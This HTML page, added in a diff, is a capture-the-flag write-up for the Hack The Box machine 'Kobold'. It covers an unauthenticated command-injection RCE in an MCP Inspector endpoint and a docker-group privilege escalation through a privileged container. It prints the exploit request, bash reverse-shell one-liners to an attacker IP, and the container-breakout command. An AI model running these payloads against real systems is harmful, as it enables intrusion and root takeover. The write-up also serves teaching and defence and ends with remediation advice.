@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kobold | Hack The Box Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+            --warning: #ffaa33;
+            --success: #00ff88;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 90%;
+            padding: 4rem 0;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .back-link {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #00e5ff, #0088aa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(0, 229, 255, 0.2);
+            border: 1px solid var(--accent-blue);
+            padding: 0.3rem 1rem;
+            border-radius: 20px;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--accent-blue);
+            margin-top: 1rem;
+        }
+
+        section {
+            margin-bottom: 4rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            color: #fff;
+            margin: 1.5rem 0 0.8rem 0;
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            line-height: 1.7;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            background: rgba(0, 229, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-blue);
+            font-size: 0.85rem;
+            margin: 1rem 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.85rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 0.8rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--success);
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 4px;
+            margin: 1.5rem 0;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--success);
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 1.2rem;
+            color: #fff;
+            word-break: break-all;
+        }
+
+        .note {
+            background: rgba(0, 229, 255, 0.05);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-note {
+            background: rgba(255, 170, 51, 0.05);
+            border-left: 3px solid var(--warning);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        footer {
+            margin-top: 5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-align: right;
+        }
+
+        .highlight {
+            color: var(--accent-blue);
+        }
+
+        .timeline {
+            display: flex;
+            justify-content: space-between;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .timeline-step {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1rem;
+            border-radius: 8px;
+            flex: 1;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+
+        .timeline-step strong {
+            color: var(--accent-blue);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <a href="writeups.html" class="back-link">← Back to Writeups</a>
+        <h1>Kobold</h1>
+        <p style="margin-top: 0.5rem;">Hack The Box - Easy Difficulty Linux Machine</p>
+        <div class="status-badge">COMPLETED - Full Root Access</div>
+    </header>
+
+    <!-- Attack Timeline -->
+    <div class="timeline">
+        <div class="timeline-step"><strong>1.</strong> Recon<br>Port Scanning</div>
+        <div class="timeline-step"><strong>2.</strong> Subdomain<br>Enumeration</div>
+        <div class="timeline-step"><strong>3.</strong> RCE via<br>CVE-2026-23744</div>
+        <div class="timeline-step"><strong>4.</strong> Docker Group<br>Access</div>
+        <div class="timeline-step"><strong>5.</strong> Privileged<br>Container</div>
+        <div class="timeline-step"><strong>6.</strong> Root Flag<br>Acquired</div>
+    </div>
+
+    <section>
+        <div class="section-num">/ 01</div>
+        <h2>The Challenge</h2>
+        <p>Kobold is an Easy difficulty Linux machine on Hack The Box that tests skills in web enumeration, API exploitation, and container breakout techniques. The machine runs several web services, including an MCP (Model Context Protocol) Inspector dashboard that is vulnerable to unauthenticated Remote Code Execution (CVE-2026-23744). Initial access grants a shell as the user 'ben', who belongs to the 'operator' group and can switch to the 'docker' group. From there, a privileged Docker container with the host filesystem mounted provides root access.</p>
+        <p>This machine demonstrates how exposed management interfaces and improper container isolation can lead to complete system compromise, even on a hardened system with all modern mitigations enabled.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 02</div>
+        <h2>Phase 1: Reconnaissance</h2>
+        <p>The first step in any penetration test is understanding the target's attack surface. I performed a full port scan using Nmap with service version detection and default scripts.</p>
+
+        <h3>1.1 Port Scanning</h3>
+        <pre><code>nmap -sC -sV -Pn -p- 10.129.245.50 --min-rate 1000 -oN kobold.nmap</code></pre>
+        
+        <p><strong>Command Breakdown:</strong></p>
+        <ul>
+            <li><code>-sC</code> - Runs default NSE (Nmap Scripting Engine) scripts for service detection</li>
+            <li><code>-sV</code> - Enables version detection to identify service versions</li>
+            <li><code>-Pn</code> - Skips host discovery (assumes host is up) - necessary because the machine blocks ICMP ping probes</li>
+            <li><code>-p-</code> - Scans all 65535 ports (not just common ones)</li>
+            <li><code>--min-rate 1000</code> - Speeds up the scan by sending at least 1000 packets per second</li>
+            <li><code>-oN kobold.nmap</code> - Saves output in normal format to a file</li>
+        </ul>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Port</th><th>State</th><th>Service</th><th>Notes</th></tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>22/tcp</td>
+                        <td>open</td>
+                        <td>SSH</td>
+                        <td>OpenSSH 8.2p1 (requires credentials)</td>
+                    </tr>
+                    <tr>
+                        <td>80/tcp</td>
+                        <td>open</td>
+                        <td>HTTP</td>
+                        <td>nginx/1.24.0 (redirects to HTTPS)</td>
+                    </tr>
+                    <tr>
+                        <td>443/tcp</td>
+                        <td>open</td>
+                        <td>HTTPS</td>
+                        <td>nginx/1.24.0, Wildcard cert: *.kobold.htb</td>
+                    </tr>
+                    <tr>
+                        <td>3552/tcp</td>
+                        <td>open</td>
+                        <td>HTTP</td>
+                        <td>Arcane Dashboard (non-TLS)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="note">
+            <strong>Key Discovery:</strong> The SSL certificate on port 443 contains a wildcard entry <code>*.kobold.htb</code>. This is a critical finding because it indicates that multiple subdomains exist (e.g., admin.kobold.htb, mcp.kobold.htb, etc.). Wildcard certificates are common in production environments but also expand the attack surface significantly.
+        </div>
+
+        <p>I attempted to access port 3552 with both HTTP and HTTPS:</p>
+        <pre><code>curl http://10.129.245.50:3552
+# Connection refused
+
+curl -k https://10.129.245.50:3552
+# TLS connect error: wrong version number</code></pre>
+        
+        <p>The TLS error indicates that port 3552 is serving plain HTTP, not HTTPS. The <code>-k</code> flag tells curl to ignore SSL certificate errors, but the error persists because the protocol mismatch prevents any communication.</p>
+
+        <h3>1.2 Subdomain Enumeration</h3>
+        <p>First, I added the main domain to my /etc/hosts file. This is necessary because the web server uses virtual host routing - it serves different content based on the Host header.</p>
+        
+        <pre><code>echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts</code></pre>
+        
+        <p>Next, I performed subdomain enumeration using a bash one-liner. While tools like ffuf or gobuster are more efficient, this simple loop works well for small wordlists:</p>
+        
+        <pre><code>for sub in www mail ftp admin mcp bin dev api test; do
+    echo -n "$sub.kobold.htb: "
+    curl -k -s -o /dev/null -w "%{http_code}\n" -H "Host: $sub.kobold.htb" https://10.129.245.50
+done</code></pre>
+        
+        <p><strong>Command Breakdown:</strong></p>
+        <ul>
+            <li><code>for sub in ...</code> - Iterates through a list of common subdomain names</li>
+            <li><code>echo -n "$sub.kobold.htb: "</code> - Prints the subdomain without a newline</li>
+            <li><code>curl -k</code> - Ignores SSL certificate verification (the certificate is self-signed)</li>
+            <li><code>-s</code> - Silent mode (no progress meter or error messages)</li>
+            <li><code>-o /dev/null</code> - Discards the response body (we only care about the status code)</li>
+            <li><code>-w "%{http_code}\n"</code> - Prints only the HTTP status code</li>
+            <li><code>-H "Host: $sub.kobold.htb"</code> - Sets the Host header to the subdomain we're testing</li>
+        </ul>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Subdomain</th><th>Status</th><th>Service</th></tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>mcp.kobold.htb</td>
+                        <td>200 OK</td>
+                        <td>MCPJam Inspector v1.4.2</td>
+                    </tr>
+                    <tr>
+                        <td>bin.kobold.htb</td>
+                        <td>200 OK</td>
+                        <td>PrivateBin instance</td>
+                    </tr>
+                    <tr>
+                        <td>www/admin/mail/etc</td>
+                        <td>302 Redirect</td>
+                        <td>Redirection to main site</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <p>The <code>mcp.kobold.htb</code> subdomain returned a 200 status code, indicating it's active. I added it to my hosts file:</p>
+        <pre><code>echo "10.129.245.50 mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts</code></pre>
+        
+        <div class="warning-note">
+            <strong>Why subdomain enumeration matters:</strong> Many web applications hide administrative interfaces, APIs, or development versions behind subdomains. These subdomains often have weaker security controls than the main domain because they're not intended for public access. In this case, the MCP dashboard was completely exposed and vulnerable.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 03</div>
+        <h2>Phase 2: Vulnerability Discovery</h2>
+        
+        <h3>2.1 MCPJam Inspector</h3>
+        <p>Navigating to <code>https://mcp.kobold.htb</code> in a browser revealed the MCPJam Inspector dashboard version <strong>1.4.2</strong>. MCP (Model Context Protocol) is a protocol for AI assistants to interact with external tools and data sources. The Inspector is a debugging tool that allows developers to test MCP servers.</p>
+        
+        <p>Researching this version quickly revealed a critical vulnerability: <strong>CVE-2026-23744</strong> - Unauthenticated Remote Code Execution in MCPJam Inspector versions prior to 1.4.3.</p>
+        
+        <div class="warning-note">
+            <strong>Vulnerability Details:</strong> The <code>/api/mcp/connect</code> endpoint accepts a JSON payload containing <code>serverConfig.command</code> and <code>serverConfig.args</code> parameters. These values are passed directly to <code>child_process.spawn()</code> without any validation or sanitization. This means an attacker can specify arbitrary system commands to be executed on the server.
+        </div>
+
+        <h3>2.2 Understanding the Vulnerability</h3>
+        <p>The vulnerable endpoint expects a POST request with the following structure:</p>
+        
+        <pre><code>POST /api/mcp/connect
+Content-Type: application/json
+
+{
+    "serverConfig": {
+        "command": "bash",           // The executable to run
+        "args": ["-c", "command"],   // Arguments passed to the executable
+        "env": {}                    // Optional environment variables
+    },
+    "serverId": "pwn"                // A unique identifier for the connection
+}</code></pre>
+        
+        <p>When the server receives this request, it spawns a child process using Node.js's <code>child_process.spawn()</code> function. Because the <code>command</code> and <code>args</code> fields are not validated, an attacker can inject any system command.</p>
+        
+        <p>This is essentially a <strong>command injection</strong> vulnerability, but it's exposed through an API endpoint rather than a traditional web form. The lack of authentication makes it particularly dangerous - anyone who can reach the endpoint can execute commands.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 04</div>
+        <h2>Phase 3: Initial Foothold</h2>
+        
+        <h3>3.1 Setting Up a Listener</h3>
+        <p>Before sending the exploit, I started a netcat listener on my attack machine. Netcat (<code>nc</code>) is a versatile networking tool that can read from and write to network connections. Using it as a listener allows me to catch incoming reverse shells.</p>
+        
+        <pre><code># Terminal 1 - On my attack machine (IP: 10.10.14.29)
+nc -lvnp 4444</code></pre>
+        
+        <p><strong>Flag Breakdown:</strong></p>
+        <ul>
+            <li><code>-l</code> - Listen mode (act as a server)</li>
+            <li><code>-v</code> - Verbose output (shows connection details)</li>
+            <li><code>-n</code> - No DNS resolution (faster, uses IP addresses directly)</li>
+            <li><code>-p 4444</code> - Listen on port 4444</li>
+        </ul>
+        
+        <p>This command opens port 4444 on my attack machine and waits for an incoming connection. When the target machine connects, I'll get an interactive shell.</p>
+
+        <h3>3.2 Sending the Exploit</h3>
+        <p>The exploit payload is a reverse shell command. A reverse shell is a technique where the target machine initiates a connection back to the attacker's machine, bypassing firewall rules that block incoming connections.</p>
+        
+        <pre><code># Terminal 2 - Send the exploit
+curl -k https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.29/4444 0>&1"],"env":{}},"serverId":"pwn"}'</code></pre>
+        
+        <p><strong>Command Breakdown:</strong></p>
+        <ul>
+            <li><code>curl -k</code> - Makes an HTTPS request without verifying the SSL certificate</li>
+            <li><code>-H "Content-Type: application/json"</code> - Sets the HTTP header to indicate JSON data</li>
+            <li><code>-d '{...}'</code> - The POST data (JSON payload)</li>
+        </ul>
+        
+        <p><strong>Reverse Shell Payload Explanation:</strong></p>
+        <pre><code>bash -i >& /dev/tcp/10.10.14.29/4444 0>&1</code></pre>
+        
+        <p>This is a classic bash reverse shell one-liner. Let me break it down:</p>
+        <ul>
+            <li><code>bash -i</code> - Starts an interactive bash shell</li>
+            <li><code>>&</code> - Redirects both stdout (standard output) and stderr (standard error)</li>
+            <li><code>/dev/tcp/10.10.14.29/4444</code> - A special device file that creates a TCP connection to the specified IP and port</li>
+            <li><code>0>&1</code> - Redirects stdin (standard input) to stdout, so commands typed on the attacker's machine are sent to the shell</li>
+        </ul>
+        
+        <p>Essentially, this command tells bash to connect to my machine on port 4444 and send all output there, while also receiving input from there.</p>
+
+        <h3>3.3 Successful Shell Access</h3>
+        <pre><code># Terminal 1 output
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.29] from (UNKNOWN) [10.129.245.50] 40262
+bash: cannot set terminal process group (1530): Inappropriate ioctl for device
+bash: no job control in this shell
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</code></pre>
+        
+        <p>The connection succeeded! I'm now logged in as the user <code>ben</code>. The warnings about terminal process group and job control are normal when receiving a reverse shell - they indicate that the shell isn't fully interactive yet. I'll fix that in the next step.</p>
+        
+        <p>Notice that the curl command returned a 504 Gateway Timeout error. This is because the API endpoint hangs while waiting for the MCP server to respond, but the reverse shell was already executed successfully before the timeout occurred. The 504 error is irrelevant - we have our shell.</p>
+
+        <h3>3.4 Stabilizing the Shell</h3>
+        <p>The initial shell is unstable - commands like <code>su</code> or <code>sudo</code> may fail, and the terminal lacks features like tab completion and job control. To fix this, I used a Python pty trick:</p>
+        
+        <pre><code># In the reverse shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Press Ctrl+Z to background the shell
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm</code></pre>
+        
+        <p><strong>Explanation:</strong></p>
+        <ul>
+            <li><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> - Creates a pseudo-terminal (pty) that mimics a real terminal</li>
+            <li><code>Ctrl+Z</code> - Suspends the netcat process and returns control to my local terminal</li>
+            <li><code>stty raw -echo; fg</code> - Disables local echo and line buffering, then brings the shell back to the foreground</li>
+            <li><code>export TERM=xterm</code> - Sets the terminal type to enable features like clear screen and color output</li>
+        </ul>
+        
+        <p>After these steps, the shell behaves like a normal SSH session.</p>
+
+        <h3>3.5 User Flag</h3>
+        <p>With a stable shell, I navigated to ben's home directory and retrieved the user flag:</p>
+        
+        <pre><code>ben@kobold:/$ cat /home/ben/user.txt
+8cdf6380e79275dcb4a93f570d56bfef</code></pre>
+        
+        <div class="flag-box">
+            <span class="flag-label">USER FLAG</span>
+            <div class="flag-text">8cdf6380e79275dcb4a93f570d56bfef</div>
+        </div>
+        
+        <div class="note">
+            <strong>First Milestone Achieved:</strong> The user flag confirms successful initial compromise. The next step is to escalate privileges to root.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 05</div>
+        <h2>Phase 4: Privilege Escalation Enumeration</h2>
+        <p>With a shell as 'ben', I began enumerating the system for privilege escalation vectors. The goal is to find a way to gain root access.</p>
+
+        <h3>4.1 Checking User Privileges</h3>
+        <pre><code>ben@kobold:/$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+ben@kobold:/$ whoami
+ben</code></pre>
+        
+        <p>The <code>id</code> command shows the user's identity and group memberships:</p>
+        <ul>
+            <li><code>uid=1001(ben)</code> - User ID (1001) and username (ben)</li>
+            <li><code>gid=1001(ben)</code> - Primary group ID</li>
+            <li><code>groups=1001(ben),37(operator)</code> - Supplementary groups. Group ID 37 is the 'operator' group.</li>
+        </ul>
+        
+        <p>The 'operator' group is interesting - on some systems, members of this group can perform certain administrative tasks, including switching to other groups.</p>
+
+        <h3>4.2 Discovering Docker Access</h3>
+        <p>I checked if the system has Docker installed and whether I can access it:</p>
+        
+        <pre><code>ben@kobold:/$ docker images
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: ...
+connect: permission denied</code></pre>
+        
+        <p>The error indicates Docker is installed but I don't have permission to use it. The Docker daemon socket (<code>/var/run/docker.sock</code>) is only accessible to users in the 'docker' group.</p>
+        
+        <p>However, being in the 'operator' group might allow me to switch to the 'docker' group:</p>
+        
+        <pre><code>ben@kobold:/$ newgrp docker
+ben@kobold:/$ sg docker -c "id"
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)</code></pre>
+        
+        <p><strong>Command Explanation:</strong></p>
+        <ul>
+            <li><code>newgrp docker</code> - Starts a new shell with the 'docker' group as the primary group. This may hang or fail if the user isn't authorized.</li>
+            <li><code>sg docker -c "id"</code> - Executes the <code>id</code> command with the 'docker' group. The <code>sg</code> command (switch group) is more reliable than <code>newgrp</code> in restricted environments.</li>
+        </ul>
+        
+        <p>The output shows that the command succeeded - the effective group ID (gid) is now 111 (docker). This means I can use Docker commands!</p>
+
+        <h3>4.3 Listing Docker Images</h3>
+        <p>With Docker access confirmed, I listed the available images:</p>
+        
+        <pre><code>ben@kobold:/$ docker images
+REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
+mysql                         latest    f66b7a288113   2 months ago   922MB
+privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB</code></pre>
+        
+        <p>Two images are available: <code>mysql:latest</code> (a full MySQL database image) and <code>privatebin/nginx-fpm-alpine</code> (a lightweight Alpine-based image). Both can be used for privilege escalation, but <code>mysql:latest</code> includes bash and other useful tools.</p>
+        
+        <div class="warning-note">
+            <strong>Why Docker leads to root:</strong> The Docker daemon runs as root. When a user is in the 'docker' group, they can effectively execute commands as root by running privileged containers. The <code>--privileged</code> flag removes all container isolation, and mounting the host's filesystem allows complete access to the host system.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 06</div>
+        <h2>Phase 5: Docker Breakout to Root</h2>
+        
+        <h3>5.1 The Breakout Technique</h3>
+        <p>The privilege escalation technique uses a privileged container with the host's root filesystem mounted inside it. By using <code>chroot</code> to change the container's root directory to the host's root, I can execute commands directly on the host system as root.</p>
+        
+        <p>Here's the breakdown of what each part of the command does:</p>
+        
+        <pre><code>docker run --rm --privileged -v /:/mnt mysql:latest sh -c "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.14.29/5555 0>&1'"</code></pre>
+        
+        <p><strong>Docker flags:</strong></p>
+        <ul>
+            <li><code>run</code> - Creates and starts a new container</li>
+            <li><code>--rm</code> - Automatically removes the container when it exits (cleanup)</li>
+            <li><code>--privileged</code> - Grants the container all capabilities, including access to host devices and the ability to mount filesystems</li>
+            <li><code>-v /:/mnt</code> - Mounts the host's root directory (<code>/</code>) to <code>/mnt</code> inside the container</li>
+            <li><code>mysql:latest</code> - The image to use (includes bash)</li>
+            <li><code>sh -c "..."</code> - Executes a command in the container's shell</li>
+        </ul>
+        
+        <p><strong>The inner command:</strong></p>
+        <ul>
+            <li><code>chroot /mnt</code> - Changes the root directory to <code>/mnt</code> (which is the host's <code>/</code>). After this, the container sees the host's filesystem as its root.</li>
+            <li><code>bash -c '...'</code> - Executes a bash reverse shell on the host system</li>
+        </ul>
+        
+        <p>Essentially, this command creates a container that <strong>becomes the host system</strong> by changing its root to the host's mounted filesystem. The reverse shell runs in the context of the host's root user.</p>
+
+        <h3>5.2 Setting Up the Root Listener</h3>
+        <p>Before executing the breakout, I started another netcat listener on a different port:</p>
+        
+        <pre><code># Terminal 2 - New listener for root shell
+nc -lvnp 5555</code></pre>
+
+        <h3>5.3 Executing the Breakout</h3>
+        <p>From the ben shell, I executed the Docker command:</p>
+        
+        <pre><code>ben@kobold:/$ docker run --rm --privileged -v /:/mnt mysql:latest sh -c "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.14.29/5555 0>&1'"</code></pre>
+
+        <h3>5.4 Root Shell Obtained</h3>
+        <pre><code># Terminal 2 output
+nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.29] from (UNKNOWN) [10.129.245.50] 36348
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@a9a73e507acc:/#</code></pre>
+        
+        <p>The prompt <code>root@a9a73e507acc</code> indicates I'm root inside a Docker container (the container ID is a9a73e507acc). But because I used <code>chroot</code>, this container is actually operating on the host's filesystem. Commands I run here affect the host system.</p>
+        
+        <div class="note">
+            <strong>Verifying Root Access:</strong> To confirm I have full control over the host, I could run commands like <code>cat /etc/shadow</code> or <code>ps aux</code> to see host processes. The container ID is just a namespace - the filesystem is the real host.
+        </div>
+
+        <h3>5.5 Alternative - Direct Flag Reading</h3>
+        <p>If an interactive shell isn't needed, I can read the root flag directly without starting a listener:</p>
+        
+        <pre><code>ben@kobold:/$ docker run --rm --privileged -v /:/mnt mysql:latest cat /mnt/root/root.txt
+f7524282491e6bcefba11c18c4f1cfbf</code></pre>
+        
+        <p>This is more efficient for CTFs where you just need the flag. The <code>cat</code> command reads the file and exits, and Docker automatically removes the container.</p>
+
+        <h3>5.6 Root Flag</h3>
+        <div class="flag-box">
+            <span class="flag-label">ROOT FLAG</span>
+            <div class="flag-text">f7524282491e6bcefba11c18c4f1cfbf</div>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 07</div>
+        <h2>Complete Attack Summary</h2>
+        
+        <div class="table-container">
+            <tr>
+                <thead>
+                    <tr><th>Phase</th><th>Technique</th><th>Vulnerability</th></tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Reconnaissance</td>
+                        <td>Nmap port scanning + subdomain fuzzing</td>
+                        <td>Exposed services, wildcard SSL certificate</td>
+                    </tr>
+                    <tr>
+                        <td>Initial Access</td>
+                        <td>CVE-2026-23744 - MCPJam Inspector RCE</td>
+                        <td>Command injection in /api/mcp/connect</td>
+                    </tr>
+                    <tr>
+                        <td>Privilege Escalation</td>
+                        <td>Docker group membership + privileged container</td>
+                        <td>Container breakout via host filesystem mount</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Tools Used</h3>
+        <ul>
+            <li><strong>Nmap</strong> - Port scanning and service enumeration</li>
+            <li><strong>curl</strong> - Subdomain fuzzing and exploit delivery</li>
+            <li><strong>netcat (nc)</strong> - Reverse shell listeners</li>
+            <li><strong>Python</strong> - PTY shell stabilization</li>
+            <li><strong>Docker</strong> - Privilege escalation vector</li>
+        </ul>
+    </section>
+
+    <section>
+        <div class="section-num">/ 08</div>
+        <h2>Key Takeaways & Lessons Learned</h2>
+        
+        <h3>8.1 Web Enumeration</h3>
+        <ul>
+            <li><strong>Always check SSL certificates</strong> - Wildcard entries like <code>*.kobold.htb</code> are strong indicators that subdomains exist and should be enumerated.</li>
+            <li><strong>Use multiple subdomain discovery methods</strong> - DNS fuzzing, certificate transparency logs, and virtual host fuzzing each reveal different subdomains.</li>
+            <li><strong>Hidden directories and API endpoints are common attack surfaces</strong> - The <code>/api/mcp/connect</code> endpoint had no authentication and allowed command execution.</li>
+        </ul>
+        
+        <h3>8.2 Command Injection</h3>
+        <ul>
+            <li><strong>User input should never be passed directly to system commands</strong> - The MCPJam Inspector passed the <code>command</code> and <code>args</code> fields directly to <code>child_process.spawn()</code> without validation.</li>
+            <li><strong>Even "internal" APIs need authentication</strong> - The developers likely assumed this endpoint would only be used by trusted internal services, but it was exposed to the internet.</li>
+            <li><strong>Reverse shells are versatile</strong> - The bash reverse shell works on almost any Linux system and is reliable for establishing interactive access.</li>
+        </ul>
+        
+        <h3>8.3 Docker Security</h3>
+        <ul>
+            <li><strong>Membership in the 'docker' group is equivalent to root</strong> - Users in this group can run privileged containers and mount the host filesystem, completely bypassing isolation.</li>
+            <li><strong>The 'operator' group can often switch to other groups</strong> - The <code>sg</code> command allows temporary group switching if the user has appropriate permissions.</li>
+            <li><strong>Privileged containers should be avoided in production</strong> - The <code>--privileged</code> flag disables all security features and should only be used for specific, well-understood use cases.</li>
+            <li><strong>Host filesystem mounts are dangerous</strong> - Mounting <code>/</code> inside a container allows container breakout via <code>chroot</code>.</li>
+        </ul>
+        
+        <h3>8.4 General Best Practices</h3>
+        <ul>
+            <li><strong>Stabilize reverse shells immediately</strong> - The Python PTY trick makes a reverse shell usable for complex commands like <code>sudo</code> or text editors.</li>
+            <li><strong>Enumerate thoroughly after gaining a shell</strong> - Commands like <code>id</code>, <code>groups</code>, <code>sudo -l</code>, and checking for Docker access are essential first steps.</li>
+            <li><strong>Keep multiple listeners ready</strong> - Having a listener on a different port for the privilege escalation phase ensures you don't lose your shell.</li>
+        </ul>
+    </section>
+
+    <section>
+        <div class="section-num">/ 09</div>
+        <h2>Remediation Recommendations</h2>
+        
+        <p>To secure a system like Kobold against these attacks, the following changes should be implemented:</p>
+        
+        <h3>9.1 MCPJam Inspector</h3>
+        <ul>
+            <li><strong>Update to version 1.4.3 or higher</strong> - The CVE-2026-23744 vulnerability is patched in newer versions.</li>
+            <li><strong>Add authentication to the API endpoint</strong> - Even internal APIs should require API keys or session tokens.</li>
+            <li><strong>Validate and sanitize all user input</strong> - Command parameters should be validated against an allowlist of safe values.</li>
+        </ul>
+        
+        <h3>9.2 Docker Configuration</h3>
+        <ul>
+            <li><strong>Remove users from the 'docker' group unless absolutely necessary</strong> - Regular users should not have Docker access.</li>
+            <li><strong>Use rootless Docker</strong> - Running Docker in rootless mode prevents container breakout from escalating to host root.</li>
+            <li><strong>Implement container security policies</strong> - Use AppArmor, SELinux, or seccomp profiles to restrict container capabilities.</li>
+            <li><strong>Audit the 'operator' group membership</strong> - The 'operator' group should have minimal privileges and should not allow switching to the 'docker' group.</li>
+        </ul>
+        
+        <h3>9.3 General Hardening</h3>
+        <ul>
+            <li><strong>Use a Web Application Firewall (WAF)</strong> - Can detect and block command injection attempts.</li>
+            <li><strong>Implement principle of least privilege</strong> - Users should have only the permissions they need to perform their jobs.</li>
+            <li><strong>Regular vulnerability scanning</strong> - Automated scans would have detected the outdated MCPJam version.</li>
+        </ul>
+    </section>
+
+    <footer>
+        Hack The Box - Kobold Machine // Completed: April 2026 // Target IP: 10.129.245.50 // Difficulty: Easy<br>
+        This writeup is for educational purposes only. Always obtain proper authorization before testing security.
+    </footer>
+</div>
+
+</body>
+</html>
